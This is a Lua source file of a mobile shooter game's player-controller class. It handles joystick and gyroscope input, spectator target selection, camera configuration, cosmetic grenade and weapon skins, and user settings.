function PlayerControllerBase:PostOnShowTouchInterface(show)
    if show then EventSystem:postEvent(EVENTTYPE_INGAME_UI, EVENTID_SHOW_JOYSTICK) end
end

function PlayerControllerBase:OnRep_bForbidCustomChat()
    EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_INGAME_REFRESH_FORBID_CUSTOM_CHAT, self.bForbidCustomChat)
end

function PlayerControllerBase:OnGoingToLoseJoystick()
    self:SetVirtualJoystickVisibility(false)
    self:ClearJoystick()
end

function PlayerControllerBase:HandleServerSpectatorChange(obj)
    if not Client and slua.isValid(obj) then
        if self:GetPetSpectatorComp() and slua.isValid(self:GetPetSpectatorComp()) and self:GetPetSpectatorComp().OnOwnerGotoSpectating then
            self:GetPetSpectatorComp():OnOwnerGotoSpectating()
        end
        EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_INGAME_SERVER_SPECTATOR_CHANGE, self.Object, obj)
        if self:IsObserver() and slua.isValid(self.BackpackObserverRepActor) then
            local safety = obj:GetPlayerControllerSafety()
            if slua.isValid(safety) and safety:GetBackpackComponent() then
                if bWriteLog then print("PlayerControllerBase:HandleServerSpectatorChange", safety:GetBackpackComponent()) end
                if slua.isValid(safety:GetBackpackComponent()) then
                    self.BackpackObserverRepActor:RefreshAllItems(safety:GetBackpackComponent())
                end
            end
        end
        local plane = obj:GetAttachParentActor()
        local isPlane = Game:IsClassOf(plane, "DefaultLuaEventPlaceholder")
        if bWriteLog then print("PlayerControllerBase:HandleServerSpectatorChange plane", obj.PlayerName, plane, isPlane, self.ThePlane) end
        if slua.isValid(plane) and isPlane and self.ThePlane ~= plane then
            self.ThePlane = plane
        end
    end
end

function PlayerControllerBase:RegistSetting()
    local sys = SubsystemMgr:Get("SettingSubsystem")
    if not sys then return end
    self:RPC_Server_SetAutoUseMelee(sys:GetUserSettings_Bool("AutoUseMelee"))
    sys:RegisterUserSettingsDelegate_Bool("AutoUseMelee", function(val) self:RPC_Server_SetAutoUseMelee(val) end)
    
    self.bPeekCanSprint = sys:GetUserSettings_Bool("PeekToSprintSwitch")
    sys:RegisterUserSettingsDelegate_Bool("PeekToSprintSwitch", function(val) self.bPeekCanSprint = val end)
    
    self.UseMotionControlType = sys:GetUserSettings_Int("Gyroscope")
    if bWriteLog then print("PlayerControllerBase: Set UseMotionControlType ", self.UseMotionControlType) end
    sys:RegisterUserSettingsDelegate_Int("Gyroscope", function(val)
        self.UseMotionControlType = val
        if bWriteLog then print("PlayerControllerBase: Set UseMotionControlType Delegate ", val, self.UseMotionControlType) end
    end)
    
    self.GyroReverse = sys:GetUserSettings_Bool("GyroReverse")
    sys:RegisterUserSettingsDelegate_Bool("GyroReverse", function(val) self.GyroReverse = val end)
    
    self.bHoldGrenadeStateEnableGyro = sys:GetUserSettings_Bool("HoldGrenadeStateEnableGyro")
    sys:RegisterUserSettingsDelegate_Bool("HoldGrenadeStateEnableGyro", function(val) self.bHoldGrenadeStateEnableGyro = val end)
end

function PlayerControllerBase:RPC_Server_SetAutoUseMelee(val)
    if Client then return end
    if bWriteLog then print("PlayerControllerBase_Debug_Msg: bAutoEquipMelleeWeaponLanded = " .. tostring(self.bAutoEquipMelleeWeaponLanded) .. " bAutoUseMelee = " .. tostring(val)) end
    self.bAutoEquipMelleeWeaponLanded = val
end

function PlayerControllerBase:JumpPlanDell(obj)
    local spec = self:IsSpectator()
    if bWriteLog then print("PlayerControllerBase:JumpPlanDell", spec) end
    if slua.isValid(obj) then
        local vtLinear = import("EViewTargetBlendFunction").VTBlend_Linear
        if spec then
            self:SetViewTargetWithBlend(obj, 0.5, vtLinear, 0, false)
            return
        end
        require("client.slua_ui_framework.util").GetAssetAsync("/Game/BluePrints/Plane/BP_PlaneDummy.BP_PlaneDummy_C", function(res)
            if res and self:GetWorld() and slua.isValid(obj) then
                local cls = slua.loadClass("/Game/BluePrints/Plane/BP_PlaneDummy.BP_PlaneDummy")
                local dummy = import("AIBlueprintHelperLibrary").SpawnAIFromClass(self:GetWorld(), cls, nil, obj:K2_GetActorLocation(), obj:K2_GetActorRotation(), true)
                if bWriteLog then print("Caller:TickParachuteComponent" .. obj:K2_GetActorLocation():ToString()) end
                if dummy and slua.isValid(obj) then
                    local moveComp = dummy:GetComponentByClass(import("CharacterMovementComponent"))
                    if moveComp ~= nil and slua.isValid(moveComp) then moveComp:SetMovementMode(import("EMovementMode").MOVE_None, 0) end
                    dummy:SetLifeSpan(5)
                end
                self:SetViewTargetWithBlend(dummy, 0, vtLinear, 0, false)
                self:AddGameTimer(0.2, false, function()
                    if slua.isValid(obj) then self:SetViewTargetWithBlend(obj, 0.5, vtLinear, 0, false) end
                end)
            elseif bWriteLog then
                print("PlayerControllerBase:JumpPlanDell, GetAssetAsync failed when path")
            end
        end)
    end
end

function PlayerControllerBase:ProcessMotionInputFailed(a, b, c, d)
    if not a and not c then return end
    if slua.isValid(self:GetVehicleUserComp()) and self:GetVehicleUserComp():CanUseGyro() then return end
    self:ProcessVehicleInput(b, d)
end

function PlayerControllerBase:MotionControliOS(a)
    self:MotionControlAndroid(a)
end

function PlayerControllerBase:MotionControlAndroid(a)
    if not Client.IsDeviceSupportGyrSensor() then
        if bWriteLog then print("PlayerControllerBase:MotionControlAndroid IsDeviceSupportGyrSensor false") end
        return
    end
    local pawn = self:K2_GetPawn()
    if not slua.isValid(pawn) then
        if bWriteLog then print("PlayerControllerBase:MotionControlAndroid Pawn not Invalid") end
        return
    end
    if not self:GetUseMotionControlEnable() then
        if bWriteLog then print("PlayerControllerBase:MotionControlAndroid UseMotionControlEnable false") end
        return
    end
    
    if not self.CalInputFromRotaionRate then return end
    local o1, o2, o3, o4 = self:CalInputFromRotaionRate(0, 0, false, false, a, self.PitchReverce, self.MotionTouchRate_Pitch, self.MotionTouchAimRate_Pitch, self.MotionRate_Pitch, self.MotionAimRate_Pitch, self.MotionTouchRate_Yaw, self.MotionTouchAimRate_Yaw, self.MotionRate_Yaw, self.MotionAimRate_Yaw, self.MotionRate_Pitch_Threshold, self.MotionRate_Yaw_Threshold, self.Left, self.Right, self.bLandScapeOrientation)
    if o3 then pawn:AddControllerPitchInput(o1) end
    if o4 then pawn:AddControllerYawInput(o2) end
end

function PlayerControllerBase:RPC_Client_ShowBattleGMOutputText(val)
    ShowBattleGMOutputText(val)
end

function PlayerControllerBase:ToString()
    local target = self:GetViewTarget()
    if target and slua.isValid(target) then
        return string.format("%s(%s)", target.PlayerName, target.PlayerKey)
    end
    return "<Invalid ViewTarget>"
end

function PlayerControllerBase:GetCurPlayerCharacterOrPetSpectator()
    if slua.isValid(self.Object) then
        if self:IsInPetSpectator() and slua.isValid(self:GetPetSpectatorComp()) and slua.isValid(self:GetPetSpectatorComp().PetSpectatorPawn) then
            return self:GetPetSpectatorComp().PetSpectatorPawn
        elseif self.GetCurPlayerCharacter then
            return self:GetCurPlayerCharacter()
        end
    end
end

function PlayerControllerBase:GetStickLeftSize()
    local center = self:GetJoyStickCenter()
    local view = require("client.common.ui_util").GetViewportSizebyScale()
    local diff = math.abs(0.5 - center.X)
    if bWriteLog then print(string.format("PlayerControllerBase:GetStickLeftSize x=%.2f, screenx=%.0f", diff, view.X)) end
    return FVector2D(diff >= 0.3 and diff or 0.3, 1) * view * 2
end

function PlayerControllerBase:MakeFireModeEffect()
    if not slua.isValid(self.Object) then return end
    local data = self:GetSuperData()
    if self.IsUse3DTouch then data.IsUse3DTouch = self:IsUse3DTouch() end
    if self.fireMode == 1 or self.fireMode == 2 then
        local sx, sy = 200, 200
        if self:GetStickLeftSize() then
            sx = math.max(sx, self:GetStickLeftSize().X)
            sy = math.max(sy, self:GetStickLeftSize().Y)
        end
        self:SetJoyStickInteractionSize(FVector2D(sx, sy))
    elseif self.fireMode == 3 then
        self:RestoreDefaultInteractionSize(0)
    end
    self:BroadcastUIMessage("UIMsg_MakeFireModeEffect", 0, "", "")
end

function PlayerControllerBase:ReadConfigFromHUD()
    self.Super:ReadConfigFromHUD()
    if self.IsUse3DTouch then self:GetSuperData().IsUse3DTouch = self:IsUse3DTouch() end
end

function PlayerControllerBase:InitCameraData()
    local cfg = require("GameLua.Mod.BaseMod.Common.GamePlayTools").GetCurrentConfig("BaseCameraConfig")
    local offsetData = import("CameraOffsetData")
    if slua.isValid(self.PlayerCameraManager) and cfg then
        for k, v in pairs(cfg) do
            local o = offsetData()
            o.SocketOffset = v.SocketOffset
            o.TargetOffset = v.TargetOffset
            o.SpringArmLength = v.SpringArmLength
            o.AdditiveOffsetFov = v.AdditiveOffsetFov
            o.FixedFov = v.FixedFov
            o.BeginInterpSpeed = v.BeginInterpSpeed
            o.EndInterpSpeed = v.EndInterpSpeed
            self.PlayerCameraManager:PushCameraDataConfigData(k, o)
        end
    end
end

function PlayerControllerBase:RPC_ClientHUDDisplayHitDamage(a, b)
    local hud = self:GetHUD()
    if slua.isValid(hud) then hud:AddHitDamage(a, b, {}, nil, true) end
end

function PlayerControllerBase:OnCreateDecal(a)
    if not slua.isValid(a) then
        if bWriteLog then log("  PlayerControllerBase:OnCreateDecal.  not slua.isValid(DecalActor)") end
        return
    end
    self:RPC_Multicast_OnCreateDecal(a.DecalId)
end

function PlayerControllerBase:RPC_Multicast_OnCreateDecal(id)
    if not Client then return end
    if bWriteLog then log("  PlayerControllerBase:OnCreateDecal. itemId: " .. tostring(id)) end
    ModuleManager.GetModule(ModuleManager.CommonModuleConfig.passive_resource_downloader):CheckResourceHasBeenDownloaded({id})
end

function PlayerControllerBase:InitGrenadeAvatarList(val)
    if self.RolewearIndex >= 0 and self.InitialKnapsackExtInfo:Num() > self.RolewearIndex and val then
        self.InitialConsumableAvatar = self.InitialKnapsackExtInfo:Get(self.RolewearIndex).KnapsackExtInfo.ConsumableAvatarList
        if bWriteLog then print(string.format("ASTExtraPlayerController::InitGrenadeAvatarList RolewearIndex=[%d], Shoulei=[%d], Smoke=[%d], Stun=[%d], Burn=[%d]", self.RolewearIndex, self.InitialConsumableAvatar.GrenadeAvatarShoulei, self.InitialConsumableAvatar.GrenadeAvatarSmoke, self.InitialConsumableAvatar.GrenadeAvatarStun, self.InitialConsumableAvatar.GrenadeAvatarBurn)) end
    end
    self.GrenadeAvatarItemList:Clear()
    self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarShoulei)
    self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarSmoke)
    self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarStun)
    self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarBurn)
end

function PlayerControllerBase:AddToGrenadeAvatarItemList(val)
    if val <= 0 then return end
    local itemId = import("BackpackUtils").GenerateItemDefineIDByItemTableIDWithRandomInstanceID(val)
    local protoId = require("GameLua.Mod.Library.GamePlay.Avatar.AvatarUtil").GetThrowWeaponProtoItemID_Old(itemId, self.Object)
    if protoId <= 0 then return end
    if bWriteLog then print("PlayerControllerBase:InitGrenadeAvatarList AddGrenadeAvatarItemList ProtoItemID:" .. tostring(protoId) .. " AvatarID:" .. tostring(val)) end
    self.GrenadeAvatarItemList:Add(protoId, val)
end

function PlayerControllerBase:ChangeWeaponAvatarList(idx)
    if idx >= 0 and self.InitialKnapsackExtInfo:Num() > idx then
        self.InitialWeaponAvatarList = require("GameLua.Mod.Library.GamePlay.Avatar.AvatarDataUtil").FilterWeaponAttachments(self, self.InitialKnapsackExtInfo:Get(self.RolewearIndex).KnapsackExtInfo.WeaponList, true)
        self:InitWeaponAvatarItems()
        self:OnWeaponAvatarUpdate()
    end
end

function PlayerControllerBase:OnWeaponAvatarUpdate() end

function PlayerControllerBase:OnPlayerKeyRepExt()
    if bWriteLog then print("PlayerControllerBase:OnPlayerKeyRepExt", self.PlayerKey) end
    EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_CONTROLLER_PLAYERKEY_CHANGE, self.Object)
end

function PlayerControllerBase:CanShowMyPet()
    local set = slua_GameFrontendHUD:GetUserSettings()
    local safety = self:GetPlayerCharacterSafety()
    if slua.isValid(safety) and safety.GetIsFPP and safety:GetIsFPP() then return set.OpenMyPetFPP end
    return set.OpenMyPet
end

function PlayerControllerBase:GetMapUIMarkManagerComponent()
    if not slua.isValid(self.MapUIMarkManagerComponent) then
        self.MapUIMarkManagerComponent = self:GetComponentByClass(import("MapUIMarkManager"))
    end
    return self.MapUIMarkManagerComponent
end

function PlayerControllerBase:SGetConsumableByXsuitAndGlider()
    local info = self.InitialKnapsackExtInfo:Get(self.RolewearIndex).KnapsackExtInfo
    local cfg = CDataTable.GetTableData("VehicleUseConfig", info.ParachuteGlider)
    if not cfg then return end
    for _, cloth in pairs(self:GetClothingInAllBackpack(self.RolewearIndex)) do
        if cfg.SuitID_s:Get(cloth.DefineID.TypeSpecificID) then return cfg.Consumable end
    end
end

function PlayerControllerBase:GetCurWearTwoPersonAircraftID()
    local id = require("GameLua.Activity.Commercialize.GamePlay.XSuit.XSuitAvatarDataUtil").GetCurrentWearGlideID(self)
    return import("AvatarUtils").IsTwoPersonAircraft(id) and id or -1
end

function PlayerControllerBase:BindMotionEvent()
    self.ScreenInput = import("ScreenInput")(require("client.common.ui_util").GetGameInstance())
    self.ScreenInput:Init()
    self.ScreenInput.OnMotionDetected:Bind(self, "OnMotionDetected")
end

function PlayerControllerBase:UseModSkin(A1, A2, A3)
    if not self.bModWeaponSkinCooldowning then
        self.bModWeaponSkinCooldowning = true
        if bWriteLog then print("PlayerControllerBase:UseModSkin") end
        self:ServerRequestUseModWeaponSkin(A3)
    end
end

function PlayerControllerBase:OnModWeaponSkinChange()
    if bWriteLog then print("PlayerControllerBase:OnModWeaponSkinChange", self.bUseModWeaponSkin) end
    local cd = 5
    local cfg = require("GameLua.Mod.BaseMod.Common.GamePlayTools").GetCurrentConfig("ModWeaponConfig")
    if cfg and cfg.Cooldown then cd = cfg.Cooldown end
    if self.bModWeaponSkinCooldowning then
        EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_MOD_WEAPON_USE_SKIN_COOLDOWN, self.bUseModWeaponSkin)
        self:AddGameTimer(cd, false, function()
            self.bModWeaponSkinCooldowning = false
            EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_MOD_WEAPON_USE_SKIN_COOLDOWN_END)
        end)
    end
end

function PlayerControllerBase:ClientCallPartnerTips(a, b, c, d)
    self:ClientCallSidePopupTips(a, b, c, d, nil)
end

function PlayerControllerBase:ClientCallSidePopupTips(A1, A2, A3, A4, A5)
    local data = {TextID = A1, FaceID = A2, RichTextID = A3, Param1 = A4, Param2 = A5}
    self:ClientDisplayCustomLuaGameTips("ClientCallSidePopupTips", 0, slua.LuaArchiverEncode(LuaStateWrapper, data))
end

function PlayerControllerBase:FindBestSpectateTarget(A1, A2, A3)
    local ETeammateSpectatorResult = import("/Script/ShadowTrackerExtra.ETeammateSpectatorResult")
    local ExtraPlayerLiveState = import("/Script/ShadowTrackerExtra.ExtraPlayerLiveState")
    local res = {
        bAllDie = true,
        bIsOnPlane = false,
        bHasSelf = false,
        bHasNullptr = false,
        TargetTeammate = nil,
        RetPlayerId = 0,
        FriendId = 0,
        TeammateResults = {}
    }
    
    if self.bWatchTeammateIgnoreDying then
        for _, t in pairs(A1) do
            if slua.isValid(t) and t.LiveState ~= ExtraPlayerLiveState.InDied and t.LiveState ~= ExtraPlayerLiveState.InDying then
                self.bWatchTeammateIgnoreDying = false
                break
            end
        end
    end
    
    local lobbyInfo = self.LobbyWatchInfo
    for _, state in pairs(A1) do
        local function CheckState(t)
            if A2 == t then
                if bWriteLog then print("PlayerControllerBase:FindBestSpectateTarget - CurPlayerState == OneTeammate Skip self") end
                table.insert(res.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_MySelf)
                res.bHasSelf = true
                return false
            end
            if not slua.isValid(t) then
                res.bAllDie = false
                if bWriteLog then print("PlayerControllerBase:FindBestSpectateTarget - OneTeammate is nil") end
                table.insert(res.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_Nullptr)
                res.bHasNullptr = true
                return false
            end
            if bWriteLog then print(string.format("PlayerControllerBase:FindBestSpectateTarget - teammate PlayerName=%s PlayerId=%d", tostring(t.PlayerName), t.PlayerId)) end
            if lobbyInfo and lobbyInfo.WatchedPlayerKey == t.PlayerKey and lobbyInfo.WatchedPlayerKey > 0 then
                res.FriendId = t.PlayerId
                if bWriteLog then print(string.format("PlayerControllerBase:FindBestSpectateTarget - friendId=%d", res.FriendId)) end
            end
            if A3 == 0 then
                if t.LiveState == ExtraPlayerLiveState.InDied or (t.LiveState == ExtraPlayerLiveState.InDying and not self.bWatchTeammateIgnoreDying) then
                    if bWriteLog then print("PlayerControllerBase:FindBestSpectateTarget - LiveState not alive") end
                    table.insert(res.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_Died)
                    return false
                end
            elseif not t:IsAlive() then
                if bWriteLog then print("PlayerControllerBase:FindBestSpectateTarget - IsAlive false") end
                table.insert(res.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_NotAlive)
                return false
            end
            if not t:IsInGame() then
                if bWriteLog then print("PlayerControllerBase:FindBestSpectateTarget - not ingame") end
                table.insert(res.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_NotInGame)
                return false
            end
            if not t:CanBeSpectated() then
                if bWriteLog then print("PlayerControllerBase:FindBestSpectateTarget - CanBeSpectated false") end
                return false
            end
            
            table.insert(res.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_Normal)
            res.bAllDie = false
            res.bIsOnPlane = t.LiveState == ExtraPlayerLiveState.InPlane
            res.TargetTeammate = t
            res.RetPlayerId = t.PlayerId
            
            if A3 == t.PlayerId then
                if bWriteLog then print("PlayerControllerBase:FindBestSpectateTarget - TeammatePlayerID == OneTeammate.PlayerId") end
                return true
            end
            if A3 == 0 and lobbyInfo and lobbyInfo.WatchedPlayerKey == t.PlayerKey and lobbyInfo.WatchedPlayerKey > 0 then
                if bWriteLog then print("PlayerControllerBase:FindBestSpectateTarget - WatchPlayerKey == OneTeammate.PlayerKey") end
                return true
            end
            return false
        end
        if CheckState(state) then break end
    end
    return res
end

return require("combine_class").DeclareFeature(PlayerControllerBase, {
    {IngameLikeFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.PlayerControllerIngameLikeFeature"},
    {CollectionTaskFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.CollectionTaskFeature"},
    {NewbieAssistFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.NewbieAssistFeature"},
    {ShowVehicleFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.ShowVehicleFeature"},
    {PlayEmoteFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.Emote.PlayEmoteFeature"},
    {CommerFeature = "GameLua.Activity.Commercialize.GamePlay.Feature.CommerFeature"},
    {ReportCrashKitFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.ReportCrashKitFeature"},
    {CoopEmotePCFeature = "GameLua.Activity.Commercialize.GamePlay.CoopEmote.CoopEmotePCFeature"},
    {SecurityNotifyPCFeature = "GameLua.Mod.BaseMod.Common.Security.SecurityNotifyPCFeature"},
    {PlayerControllerFatalDamageFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.PlayerControllerFatalDamageFeature"},
    {OncePerGameAkEventFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.OncePerGameAkEventFeature"},
    {MLAIVoiceFeature = "GameLua.Mod.BaseMod.Gameplay.AI.MLAIVoiceFeature"}
}, "PlayerControllerBase")
